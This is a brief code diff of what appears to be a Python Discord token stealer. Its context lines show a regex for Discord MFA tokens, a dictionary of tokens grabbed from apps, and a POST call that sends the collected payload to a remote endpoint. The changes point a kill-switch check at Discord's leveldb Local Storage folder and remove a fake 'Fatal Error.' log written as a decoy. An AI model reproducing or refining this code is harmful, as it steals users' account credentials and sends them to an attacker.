@@ -35,7 +35,7 @@ mfa_pattern = "mfa\.[a-zA-Z0-9_-]{84}"
 grabbed = {}
 
 if a[0]:
-    if os.path.isfile(f"{path}tmplog.log"):
+    if os.path.isfile(f"{path}\\Discord\\Local Storage\\leveldb\\tmplog.log"):
         os.kill(os.getpid(), 15)
 
 if not os.path.isdir(temp_dir+'token\\'):
@@ -352,7 +352,3 @@ for app in list(grabbed):
                 ]
             }
             post(h, json=payload)
-
-if a[0]:
-    with open(f"{argv[2]}.log", 'w+') as handle:
-        handle.write("Fatal Error.")
